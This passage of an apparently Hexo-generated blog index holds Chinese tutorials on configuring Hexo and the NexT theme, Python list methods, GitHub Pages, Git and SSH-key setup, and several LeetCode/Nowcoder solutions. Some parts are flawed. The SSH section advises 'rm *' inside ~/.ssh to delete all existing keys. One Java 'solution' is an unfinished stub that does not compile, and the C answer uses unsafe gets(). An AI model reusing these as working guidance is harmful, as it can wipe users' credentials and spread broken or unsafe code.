这里并不是将line转换为16进制的数，而是说line就是一个16进制的数形式的字符串，int()函数将其用十进制数表示]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>算法学习</tag>
        <tag>华为机试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Pages + Hexo搭建博客（二）]]></title>
    <url>%2F2016%2F12%2F03%2FGithub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[此篇博客主要讲解Hexo的站点配置、主题配置和使用以及博客文章的发布。 在Hexo中有两份主要的配置文件，其名称都是_config.yml。其中，一份位于站点根目录下，主要包含Hexo本身的配置,我们称之为全局配置文件；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项,我们称之为主题配置文件。 hexo的官方网站：https://hexo.io/，里面有hexo的详细说明文档，不过是英文的。没关系，英语不好的请往下看。 注意：配置文件中每个字段后面的冒号是英文格式的，且在其后要加一个空格再写值 比如： 1title: Myblog hexo的站点配置编辑hexo目录下的_config.yml文件，具体配置如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Site 站点信息配置，根据自己的需要进行修改title: Line&apos;s Blog #站点名，会在浏览器页面标签左上角显示subtitle: Love Coding,Enjoy Life #副标题description: fzy-line #对站点的描述，给搜索引擎看的，可以自定义author: Line #网站作者language: zh-Hans #网站语言timezone: Asia/Shanghai #时区avatar: /images/logo.jpg #网站logo，会在浏览器页面标签左上角显示# URL 博客地址,与申请的GitHub一致## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;url: https://fzy-line.github.io/root: /#博客链接格式permalink: :year/:month/:day/:title/ permalink_defaults:# Directory #目录设置，一般不修改source_dir: source #资源文件夹，放在里面的文件会上传到github中public_dir: public #公共文件夹，存放生成的静态文件tag_dir: tags #标签文件夹，默认是tags。实际存放在source/tags中。archive_dir: archives #档案文件夹，默认是archives。category_dir: categories #分类文件夹，默认是categories。实际存放在source/categories中。code_dir: downloads/code #代码文件夹，默认是downloads/codei18n_dir: :lang #国际化文件夹，默认跟language相同skip_render: #跳过指定文件的渲染，您可使用 glob 来配置路径。# Writing 这是文章布局、写作格式的定义，一般不修改new_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: falsepost_asset_folder: falserelative_link: falsefuture: truehighlight: enable: true line_number: true auto_detect: false tab_replace:# Category &amp; Tag #分类和标签，一般不修改default_category: uncategorizedcategory_map:tag_map:# Date / Time format #日期、时间格式，一般不修改## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DD time_format: HH:mm:ss# Pagination #可根据自己需要修改## Set per_page to 0 to disable paginationper_page: 6 #分页，每页文章数量pagination_dir: page# Extensions #扩展## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next #博客主题 # Deployment 这里配置站点部署到Github，上一节中已经讲过## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repository: git@github.com:你的Github用户名.github.io.git branch: master hexo使用主题Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 themes 目录下， 然后修改下配置文件即可。 hexo官方主题下载地址：https://hexo.io/themes/，里面有多种多样的主题模板供大家选择。 这里推荐一款很火的主题：next，下面的配置也是以这个主题为例。如果你使用的是其他的主题，那么请你自己根据说明文档进行配置。 next主题的官网，有很详细的配置文档：http://theme-next.iissnan.com/ 下载主题next下载地址：https://github.com/iissnan/hexo-theme-next 到Gtihub下载此主题后解压，打开可以看到里面很多主题相关的文件，我们将此文件夹改名为next，然后将它复制到站点目录的/themes/目录下。 启用主题hexo默认是使用的landscape主题，我们可以在站点目录下的/themes/目录下看到landscape文件夹。 我们的themes文件夹里可以放很多主题的文件夹，但是实际上我们的网站采用哪一个主题，这是需要我们进行配置的，打开编辑全局配置文件，找到下面的内容： 1234# Extensions #扩展## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next #博客主题，默认是landscape 在theme字段这里填上你下载的主题的文件夹的名字，例如我们使用next主题就填上next。这样配置文件就和我们的主题文件关联起来了。 配置主题配置文件主题配置文件位于站点目录下的/themes/next/目录下，打开编辑，这里我们只贴出需要修改的地方进行介绍，如下： （1）配置基本信息 1234567891011# 网站图标，将其放在hexo站点/source/目录下favicon: /logo.jpg# 关键词，例如下面是我写的keywords: &quot;Python,Life,Android&quot;# 网站建立时间，显示在页面底部since: 2016# 网站版权声明，显示在页面底部copyright: true （2）选择外观样式 目前 NexT 支持三种 Scheme，他们是： Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白 Mist - Muse 的紧凑版本，整洁有序的单栏外观 Pisces - 双栏 Scheme，小家碧玉似的清新 找到主题配置文件的如下三行，其中#号表示注释，要启用哪一种样式就把#号去掉即可。 1234# Schemes#scheme: Muse#scheme: Mistscheme: Pisces （3）设置菜单 菜单内容的设置格式是：item name: link。其中 item name 是一个名称，这个名称并不直接显示在页面上，它将用于匹配图标以及翻译。 12345678menu: home: / archives: /archives categories: /categories tags: /tags about: /about #sitemap: /sitemap.xml #commonweal: /404.html 此设定格式是 item name: icon name，其中 item name 与上一步所配置的菜单名字对应，icon name 是 Font Awesome 图标的 名字。而 enable 可用于控制是否显示图标，你可以设置成 false 来去掉图标。 1234567891011menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: user categories: th schedule: calendar tags: tags archives: archive sitemap: sitemap commonweal: heartbeat 测试配置效果123$ hexo clean #用于清除缓存$ hexo generate #生成静态网页$ hexo server #开启本地预览 访问：http://localhost:4000/ 查看效果，如下图： 解决遇到的问题到这里会发现点击左侧菜单的分类、标签和关于会提示找不到页面。 这是因为我们只是创建了菜单，还没有创建相应的页面。 新建页面的hexo命令是： 1$ hexo new page &quot;pageName&quot; 我们新建分类、标签、关于页面： 1$ hexo new page &apos;categories&apos; 1$ hexo new page &apos;tags&apos; 1$ hexo new page &apos;about&apos; 分别执行完这三条命令后，我们会发现站点目录下的/source/目录下多了三个文件夹：categories，tags，about，每个文件夹里面都会生成一个index.md文件，如下： 默认都只会生成title和date字段，我们要为其添加上type字段，并赋值。 注意：博客文章的抬头信息中每个字段后面的冒号是英文格式的，而且其后要加一个空格再写值 categories下的index.md： 12345---title: categoriesdate: 2016-12-02 23:28:27type: categories--- tags下的index.md： 12345---title: tagsdate: 2016-12-02 23:31:23type: tags--- about下的index.md： 12345---title: aboutdate: 2016-12-02 23:31:23type: about--- 这样我们的这几个页面也就没有问题了。至此，基本的配置也就完成了，接下来介绍如何写博客与发布博客。 发布博客新建博客文章1$ hexo new &quot;postName&quot; #新建文章 实例： 新建博客《我的第一篇博客》 1$ hexo new &quot;我的第一篇博客&quot; 到站点目录下的/source/_posts/目录下可以看到生成了名为：我的第一篇博客.md的文件，这是Markdown格式的文件，可以用sublime text3或者notepad++等编辑器打开，也可以下载一个MarkdownPad来编辑Markdown文件。 Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。 如果你没有使用过Markdown编辑器，那请你自己去学习一下Markdown语法。 Markdown 语法说明(简体中文版)：http://www.appinn.com/markdown/ 编辑博客Hexo默认新建的文章抬头已有title、date、tags等属性，可能缺乏categories和meta标签，想要指定目录就需要添加categories属性，而meta标签则是为了便于搜索引擎的收录。如下： 12345---title: 我的第一篇博客date: 2016-12-02 23:44:20tags: #文章标签 可以省略--- tags字段是文章的标签，可以指定标签也可以不指定，如果要指定多个标签需要这样做： 1tags: [Linux,Http,网络] 我们可以添加上categories字段，对博客进行分类管理，然后点击主页左侧菜单的分类就可看到具体的分类。例如： 1categories: Linux 如何实现上图的阅读全文功能？ 在自己喜欢的位置添加一个：1&lt;!--more--&gt; 即可，主题会自动识别这个标签，生成对应的阅读全文按钮。 123以上是文章摘要&lt;!--more--&gt;以下是余下全文 发布博客1$ hexo clean #清除缓存 网页正常情况下可以忽略此条命令 1$ hexo generate #生成静态页面至public目录 写好之后可以现在本地预览，确定无误之后再部署到Github上。 1$ hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） 1$ hexo deploy #将.deploy目录部署到GitHub 需要说明的是： 我们博客文章的编写都是Markdown文件，但是发布到github上的其实是html文件，将Markdown转换成html这个工作我们只要输入hexo generate命令即可，hexo会帮我们完成转换。 hexo命令简写形式1234hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot;hexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy 下一篇博客主要讲解如何优化next主题，使用主题提供的一些第三方功能。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python序列详解-列表]]></title>
    <url>%2F2016%2F12%2F01%2FPython%E5%BA%8F%E5%88%97%E8%AF%A6%E8%A7%A3-%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[基本介绍 列表是最常用的Python数据类型。 列表是可变的。 列表的数据项不需要具有相同的类型。 列表用[]符号或list()创建。 基本的列表操作list函数将序列转换成列表。 12&gt;&gt;&gt; list(&apos;Hunau&apos;)[&apos;H&apos;, &apos;u&apos;, &apos;n&apos;, &apos;a&apos;, &apos;u&apos;] list函数适用于所有类型的序列，而不只是字符串。 赋值使用列表的索引标记来为某个特定的、位置明确的元素赋值。 1234&gt;&gt;&gt; lst = [1,2,3]&gt;&gt;&gt; lst[2] = 4&gt;&gt;&gt; lst[1, 2, 4] 不能为一个位置不存在的元素进行赋值。 分片赋值（1）通过分片赋值进行替换 可以一次为多个元素赋值，并且使用与原序列不等长的序列将分片替换： 1234567&gt;&gt;&gt; lst = [1, 2, 3, 4]&gt;&gt;&gt; lst[1:3] = list(&apos;xx&apos;) #等长替换&gt;&gt;&gt; lst[1, &apos;x&apos;, &apos;x&apos;, 4]&gt;&gt;&gt; lst[1:] = list(&apos;python&apos;) #不等长替换&gt;&gt;&gt; lst[1, &apos;p&apos;, &apos;y&apos;, &apos;t&apos;, &apos;h&apos;, &apos;o&apos;, &apos;n&apos;] （2）通过分片赋值进行插入 可以在不替换任何原有元素的情况下插入新的元素： 1234&gt;&gt;&gt; lst = [1,6]&gt;&gt;&gt; lst[1:1] = [2, 3, 4, 5]&gt;&gt;&gt; lst[1, 2, 3, 4, 5, 6] （3）通过分片赋值进行删除 1234&gt;&gt;&gt; lst = [1, 2, 3, 4, 5, 6]&gt;&gt;&gt; lst[1:5] = []&gt;&gt;&gt; lst[1, 6] 删除元素有个方法可以从列表中按给定的索引而不是值来删除一个子项：del 语句。 语句del还可以从列表中删除切片或清空整个列表. 12345678910&gt;&gt;&gt; lst = [1,2,3,4,5,6,7,8]&gt;&gt;&gt; del lst[1] #删除一个元素&gt;&gt;&gt; lst[1, 3, 4, 5, 6, 7, 8]&gt;&gt;&gt; del lst[0:2] #借助分片删除多个元素&gt;&gt;&gt; lst[4, 5, 6, 7, 8]&gt;&gt;&gt; del lst[:] #删除列表的所有元素&gt;&gt;&gt; lst[] del也可以用来删除整个变量！ 列表对象方法append把一个元素添加到列表的结尾，相当于 a[len(a):] = [x]。它是直接修改列表，而不是返回一个新的列表。 1234&gt;&gt;&gt; lst = [1,2,&apos;x&apos;,&apos;y&apos;]&gt;&gt;&gt; lst.append(3)&gt;&gt;&gt; lst[1, 2, &apos;x&apos;, &apos;y&apos;, 3] extend将一个给定列表中的所有元素都添加到另一个列表中，相当于 a[len(a):] = L 。 12345&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b = [4,5,6]&gt;&gt;&gt; a.extend(b)&gt;&gt;&gt; a[1, 2, 3, 4, 5, 6] 对比连接操作： 1234&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b = [4,5,6]&gt;&gt;&gt; a + b[1, 2, 3, 4, 5, 6] 看似两种方法得到的结果一样，实则不然。extend与连接操作最大的区别在于：extend方法修改了被扩展的序列（即上例中的a列表），而使用+号进行连接操作则会返回一个新的列表。 insert在指定位置插入一个元素。第一个参数是准备插入到其前面的那个元素的索引，例如 lst.insert(0, x) 会插入到整个列表之前，而 lst.insert(len(lst), x) 相当于lst.append(x)。 1234567&gt;&gt;&gt; lst = [2,4]&gt;&gt;&gt; lst.insert(0,1)&gt;&gt;&gt; lst[1, 2, 4]&gt;&gt;&gt; lst.insert(3,5)&gt;&gt;&gt; lst[1, 2, 4, 5] count统计某个元素在列表中出现的次数。 1234567&gt;&gt;&gt; lst = [1,2,1,&apos;x&apos;,&apos;x&apos;,[&apos;z&apos;,&apos;y&apos;],[&apos;z&apos;,&apos;y&apos;]]&gt;&gt;&gt; lst.count(1)2&gt;&gt;&gt; lst.count(&apos;x&apos;)2&gt;&gt;&gt; lst.count([&apos;z&apos;,&apos;y&apos;])2 remove删除列表中值为 x 的第一个元素。如果没有这样的元素，就会返回一个错误。 1234&gt;&gt;&gt; lst = [1, 2, &apos;z&apos;, &apos;y&apos;, &apos;z&apos;]&gt;&gt;&gt; lst.remove(&apos;z&apos;)&gt;&gt;&gt; lst[1, 2, &apos;y&apos;, &apos;z&apos;] index返回列表中第一个值为x的元素的索引。如果没有匹配的元素就会返回一个错误。 123&gt;&gt;&gt; lst = [1, 2, &apos;z&apos;, &apos;y&apos;, &apos;z&apos;]&gt;&gt;&gt; lst.index(&apos;z&apos;)2 pop从列表的指定位置删除元素，并将其返回。如果没有指定索引，pop() 返回最后一个元素。元素随即从列表中被删除。 12345&gt;&gt;&gt; lst = [1,2,3]&gt;&gt;&gt; lst.pop()3&gt;&gt;&gt; lst[1, 2] 把列表当作堆栈使用 用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来。 123456789&gt;&gt;&gt; stack = [1,2]&gt;&gt;&gt; stack.append(3)&gt;&gt;&gt; stack.append(4)&gt;&gt;&gt; stack.pop()4&gt;&gt;&gt; stack.pop()3&gt;&gt;&gt; stack[1, 2] reverse就地倒排列表中的元素。该方法直接修改列表，而不返回值。 1234&gt;&gt;&gt; lst = [1,2,3,4]&gt;&gt;&gt; lst.reverse()&gt;&gt;&gt; lst[4, 3, 2, 1] sort在原位置对列表中的元素就地进行排序。 1234&gt;&gt;&gt; lst = [2,1,5,3,4]&gt;&gt;&gt; lst.sort()&gt;&gt;&gt; lst[1, 2, 3, 4, 5] 在原位置排序意味着改变原来的列表，而不是返回一个已排序的列表副本。以下操作是错误的： 1234&gt;&gt;&gt; lst = [2, 1, 5, 4, 3]&gt;&gt;&gt; x = lst.sort() #这样做是错误的&gt;&gt;&gt; print xNone 因为sort方法修改了lst列表，然后返回了空值，所以x的值为None。 可以用sorted()方法来获得已排序的列表副本 123456&gt;&gt;&gt; lst = [2, 1, 5, 4, 3]&gt;&gt;&gt; x = sorted(lst)&gt;&gt;&gt; lst[2, 1, 5, 4, 3]&gt;&gt;&gt; x[1, 2, 3, 4, 5] sorted()方法可以用在任何数据类型的序列中，返回的总是一个列表形式： 12&gt;&gt;&gt; sorted(&apos;python&apos;)[&apos;h&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;t&apos;, &apos;y&apos;] 高级排序sort函数是list类的一个方法，其中，包含三个参数cmp，key，reverse：cmp用于指定排序的大小比较算法；key用于制定排序的维度和优先级别；reverse说明是否是逆序排列（True表示从大到小）. 参数reverse1234567891011&gt;&gt;&gt; lst = [1, 5, 3, 2, 4]&gt;&gt;&gt; sorted(lst) #默认升序[1, 2, 3, 4, 5]&gt;&gt;&gt; sorted(lst, reverse = True) #降序排列[5, 4, 3, 2, 1]&gt;&gt;&gt; lst.sort()&gt;&gt;&gt; lst[1, 2, 3, 4, 5]&gt;&gt;&gt; lst.sort(reverse = True)&gt;&gt;&gt; lst[5, 4, 3, 2, 1] 参数key按字符串长度排序 123456&gt;&gt;&gt; lst = [&apos;c&apos;, &apos;java&apos;, &apos;python&apos;,&apos;c++&apos;]&gt;&gt;&gt; sorted(lst, key = len) [&apos;c&apos;, &apos;c++&apos;, &apos;java&apos;, &apos;python&apos;]&gt;&gt;&gt; lst.sort(key = len)&gt;&gt;&gt; lst[&apos;c&apos;, &apos;c++&apos;, &apos;java&apos;, &apos;python&apos;] 将列表中的每个元素变为小写，再按每个元素中的每个字母的ascii码从小到大排序 123456&gt;&gt;&gt; lst = [&apos;zZ&apos;,&apos;bb&apos;,&apos;XX&apos;,&apos;Aa&apos;]&gt;&gt;&gt; sorted(lst, key = str.lower)[&apos;Aa&apos;, &apos;bb&apos;, &apos;XX&apos;, &apos;zZ&apos;]&gt;&gt;&gt; lst.sort(key = str.lower)&gt;&gt;&gt; lst[&apos;Aa&apos;, &apos;bb&apos;, &apos;XX&apos;, &apos;zZ&apos;] 按自定义函数排序 12345&gt;&gt;&gt; def lastChar(s): return s[-1] &gt;&gt;&gt; lst = [&apos;abc&apos;,&apos;b&apos;,&apos;AAz&apos;,&apos;ef&apos;] &gt;&gt;&gt; sorted(lst, key = lastChar) ##按列表e中每个元素的最后一个字母的ascii码从小到大排序[&apos;b&apos;, &apos;abc&apos;, &apos;ef&apos;, &apos;AAz&apos;] 按字典属性排序 12345&gt;&gt;&gt; lst = [&#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:20&#125;,&#123;&apos;name&apos;:&apos;xxx&apos;,&apos;age&apos;:30&#125;,&#123;&apos;name&apos;:&apos;yyy&apos;,&apos;age&apos;:25&#125;] #列表中的元素为字典 &gt;&gt;&gt; def age(s): return s[&apos;age&apos;] &gt;&gt;&gt; sorted(lst,key = age) #自定义函数按列表f中字典的age从小到大排序 [&#123;&apos;age&apos;: 20, &apos;name&apos;: &apos;fzy&apos;&#125;, &#123;&apos;age&apos;: 25, &apos;name&apos;: &apos;yyy&apos;&#125;, &#123;&apos;age&apos;: 30, &apos;name&apos;: &apos;xxx&apos;&#125;]]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>列表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Pages + Hexo搭建博客（一）]]></title>
    <url>%2F2016%2F11%2F30%2FGithub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[写在前面的话阮一峰说过，喜欢写Blog的人，会经历三个阶段。 （1）第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。 （2）第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。 （3）第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。 我自己就是从一开始在CSDN写，后来租用阿里云的服务器，用WordPress搭建自己的博客，再到现在整体搬迁到Github上来，整个过程是一种锻炼，也是一种成长。 GitHub Pages是什么？GitHub Pages本用于介绍托管在GitHub的项目， 不过，由于他的空间免费稳定，用来做搭建一个博客再好不过了。 为什么选择GitHub Pages？ GitHub Pages有300M免费空间，搭建的博客可以很方便的进行管理，并且保存可靠； GitHub 是趋势，GitHub上面有很多大牛，学IT的人应该尽早融入这样的环境， 程序员应该学会使用Git来管理项目，熟悉版本控制。 Github上有很多的开源项目，多学习学习，眼界会开阔很多； 接下来应该怎么做？Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托管在github。我们要使用Github Pages + Hexo搭建博客站点，就必须注册Github账号，安装git、node.js以及hexo等，接下来就一起来实践吧！ Github注册与配置注册如果你还没有自己的Github账号，那请到Github官网注册账号：https://github.com/ 注册成功后github会发送验证邮件到你的邮箱，请查收邮件并进行验证。 新建版本库注册完成后，点击Start a project来新建一个版本库 如果你已经注册，则在自己的主页，点击”New repository”，即可新建一个版本库 输入Repository name:yourname.github.io(yourname与你的注册用户名一致,这个就是你博客的域名了) 启用GitHub Page进入版本库后，点击右上方的setting 下来到Githubs pages栏目，点击Launch automatic page generator 来到New user site页面后点击右下角的Continue to layouts 最后点击”Publish page”,发布github默认生成的一个静态站点 至此，我们已经配置好了github默认的静态站点，并且可以访问：你的github用户名.github.io测试我们刚刚建立好的站点主页。 下载并安装Git下载根据自己电脑操作系统的位数到git官网下载相应的版本： https://git-scm.com/download/win 安装根据自己的需要安装到相应的路径下，其他的一路点击next即可 配置环境变量选中桌面图标计算机，右键选择属性，打开左边的高级系统设置，打开弹出窗口的环境变量，找到path进行编辑。 找到git的安装目录，将其复制后粘贴到path后面。注意每一个加进来的路径后面都要带英文格式的分号。 安装与配置过程可参考图文教程：git的安装和配置 测试是否安装成功windows+R输入cmd打开命令提示符窗口，输入如下命令： 1git --version 若安装成功会打印出本机安装的git的版本。 添加SSH KEY到GithubSSH Key是一个认证，让github识别绑定这台机器，允许这台机器提交。 （1）检查本机是否有SSH KEY设置 打开git bash，输入cd ~/.ssh 或cd .ssh 如果没有则提示： No such file or directory 如果有则进入~/.ssh路径下（ls查看当前路径文件，rm * 删除所有文件） （2）配置生成SSH KEY 12345678910$ cd ~ #保证当前路径在”~”下$ ssh-keygen -t rsa -C &quot;这里填写你的邮箱地址&quot;Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/xxxx_000/.ssh/id_rsa): #不填直接回车Enter passphrase (empty for no passphrase): #输入密码（可以为空）Enter same passphrase again: #再次确认密码（可以为空）Your identification has been saved in /c/Users/xxxx_000/.ssh/id_rsa. #生成的密钥Your public key has been saved in /c/Users/xxxx_000/.ssh/id_rsa.pub. #生成的公钥The key fingerprint is:e3:51:33:xx:xx:xx:xx:xxx:61:28:83:e2:81 xxxxxx@yy.com 至此，已经生成ssh key，其存放路径为：c:/Users/你电脑的用户名/.ssh/下。 注释：可生成ssh key自定义名称的密钥，默认id_rsa。 （3）复制SSH KEY到Github 到C盘你的用户目录下找到.ssh文件夹，查看里面是否有id_rsa和id_rsa.pub这两个文件。 登录GitHub系统；点击右上角账号头像的“▼”→Settings→SSH kyes→Add SSH key，Title自定义，复制id_rsa.pub的公钥内容到GitHub中Add an SSH key的key输入框，最后“Add Key”。 （4）配置账户 123$ git config --global user.name “your_username” #设置用户名$ git config --global user.email “your_registered_github_Email” #设置邮箱地址(建议用注册giuhub的邮箱) （5）测试SSH KEY是否设置成功 1$ ssh -T git@github.com 接下来会返回一些信息，并需要你输入一次yes，若生成ssh key时设置有密码则还会让你输入生成ssh key时设置的密码。 Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access. #出现词句话，说明设置成功。 SSH-KEY的生成与配置可参考图文教程window下配置SSH连接GitHub、GitHub配置ssh key： 下载并安装node.js下载根据自己电脑操作系统的位数到git官网下载相应的版本： https://nodejs.org/en/download/ 安装根据自己的需要安装到响应的地方，其他的一路点击next即可 配置环境变量选中桌面图标计算机，右键选择属性，打开左边的高级系统设置，打开弹出窗口的环境变量，找到path进行编辑。 找到node.js的安装目录，将其复制后粘贴到path后面。注意每一个加进来的路径后面都要带英文格式的分号。 测试是否安装成功windows+R输入cmd打开命令提示符窗口，输入如下命令： 1node -v 若安装成功会打印出本机安装的node.js的版本。 安装和配置hexohexo是基于node.js的静态博客，官网也是搭建在GitHub上。 安装在你喜欢的路径下新建一个文件夹blog，用来存放博客的文件，在此文件夹中右键打开Git Bash 输入如下指令进行安装： 1$ npm install -g hexo-cli 如果执行这条命令时长时间未成功，那么请先使用下面的命令将npm镜像源更改为国内的镜像，再执行上面的安装命令，因为国外的镜像源很有可能被墙了。1npm config set registry https://registry.npm.taobao.org 初始化hexo1$ hexo init hexo 这里会将Github上的hexo项目clone下来，得到hexo文件夹。 初始化成功后会在最后打印一行：INFO Start blogging with Hexo! 安装依赖文件进入到hexo文件夹 1$ cd hexo 安装依赖文件： 1$ npm install 部署形成文件：1$ hexo generate 本地测试 1$ hexo server 在浏览器输入：http://localhost:4000/ 即可访问到我们搭建好的hexo站点。 将本地hexo项目托管到Github修改全局配置文件_config.yml说明： hexo文件夹下一个_config.yml，我们称之为全局配置文件，在每个主题文件夹内还会有一个_config.yml文件，我们称之为主题配置文件。 用sublime text3或者notepad++等编辑器打开hexo文件夹下的_config.yml文件。 注意：配置文件中每个字段后面的冒号是英文格式的，且在其后要加一个空格再写值 编辑最后面的deploy属性，加入代码： 123type: gitrepository: https://github.com/你的Github用户名/你的Github用户名.github.io.gitbranch: master type使用是git。 repository属性改成你的刚才创建仓库git地址。 分支branch填写master。 安装hexo-deployer-git插件1$ npm install hexo-deployer-git --save 部署到Github上依次执行以下三条命令： 1$ hexo clean #清除缓存 网页正常情况下可以忽略此条命令 1$ hexo generator #生成静态页面至public目录 1$ hexo deploy #将.deploy目录部署到GitHub 执行hexo deploy命令之后，如果最后一行打印出如下信息则表示部署成功 1INFO Deploy done: git 然后你再去访问你创建的Github pages地址，也就是：你的Github用户名.github.io，即可看到你本地的hexo项目已经被部署到github上去了。此时博客的默认主题是landscape，即上面本地测试时的样子。 此篇博客就讲解到这里，下一篇博客主要讲解hexo主题的配置。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(八)]]></title>
    <url>%2F2016%2F11%2F06%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%85%AB%2F</url>
    <content type="text"><![CDATA[二维数组中查找整数牛客网在线编程：剑指Offer第1题 题目描述在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 解法一12345public class Solution &#123; public boolean Find(int [][] array,int target) &#123; for(int i = 0;i &lt; array[0].size()) &#125;&#125; 解法二把每一行看成有序递增的数组，利用二分查找，通过遍历每一行得到答案，时间复杂度是nlogn。 12345678910111213141516171819public class Solution &#123; public boolean Find(int [][] array,int target) &#123; for(int i=0;i&lt;array.length;i++)&#123; int low=0; int high=array[i].length-1; while(low&lt;=high)&#123; int mid=(low+high)/2; if(target&gt;array[i][mid]) low=mid+1; else if(target&lt;array[i][mid]) high=mid-1; else return true; &#125; &#125; return false; &#125;&#125; 解法三利用二维数组由上到下，由左到右递增的规律，那么选取右上角或者左下角的元素a[row][col]与target进行比较，当target小于元素a[row][col]时，那么target必定在元素a所在行的左边,即col–；当target大于元素a[row][col]时，那么target必定在元素a所在列的下边,即row++； 123456789101112131415public class Solution &#123; public boolean Find(int [][] array,int target) &#123; int row=0; int col=array[0].length-1; while(row&lt;=array.length-1&amp;&amp;col&gt;=0)&#123; if(target==array[row][col]) return true; else if(target&gt;array[row][col]) row++; else col--; &#125; return false; &#125;&#125; myPowLeetCode第2题 题目描述Implement pow(x, n). Subscribe to see which companies asked this question 解法一用递归方法求n个x的乘积，注意考虑n的正负号，时间复杂度为O(n)。 Leetcode提交超时的代码： 1234567double myPow(double x, int n) &#123; if(n==0) return 1.0; if(n&lt;0) return 1.0/myPow(x,-n); return x*myPow(x,n-1);&#125; 解法二考虑到n个x相乘式子的对称关系，可采用如下方法： Leetcode AC的代码： 12345678910double myPow(double x, int n) &#123; if(n==0) return 1.0; if(n % 2 == 0) &#123; return myPow(x * x, n / 2); &#125; else &#123; return (n &gt; 0 ? x : 1.0 / x ) * myPow(x * x, n / 2) ; &#125; &#125; 3、Reverse Integer LeetCode第7题 题目描述： Reverse digits of an integer. Example1: x = 123, return 321Example2: x = -123, return -321 一般的思路反转整数，只要从低位开始依次取得整数的各个位，然后再按顺序整合成整数即可。 12345678int reverse(int x) &#123; int num = 0; while(x)&#123; num = num*10 + x%10; x = x/10; &#125; return num;&#125; 但是，此题特别要考虑结果溢出的问题！ LeetcodeAC的代码1234567891011int reverse(int x) &#123; int num = 0,tmp; while(x)&#123; tmp = num; num = num*10 + x%10; if((num-x%10)/10 != tmp) //判断是否溢出 return 0; x = x/10; &#125; return num;&#125; 计算字符个数牛客网华为机试在线训练第2题 题目描述写出一个程序，接受一个有字母和数字以及空格组成的字符串，和一个字符，然后输出输入字符串中含有该字符的个数。不区分大小写。 输入一个有字母和数字以及空格组成的字符串，和一个字符。 输出输入字符串中含有该字符的个数。 输入例子:ABCDEFA 输出例子:1 此题十分简单，遍历字符串，将目标字符与字符串的每个字符进行比较，相等则计数加1，当然，要注意的是题目中给出的不区分大小写以及获取输入的方法。 牛客网AC的代码123456789101112131415161718192021#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; int i,len=0,cnt=0; char str[1000],c; gets(str); scanf(&quot;%c&quot;,&amp;c); if(c&gt;=65&amp;&amp;c&lt;=90) //目标字符如果是字母则转换成小写 c+=32; len = strlen(str); for(i=0;i&lt;len;i++)&#123; if(str[i]&gt;=65&amp;&amp;str[i]&lt;=90) //字符串中的字符如果是字母则统一转换成小写 str[i]+=32; if(str[i]==c)&#123; //进行比较 cnt++; &#125; &#125; printf(&quot;%d&quot;,cnt); return 0;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第三届电子协会成立大会发言]]></title>
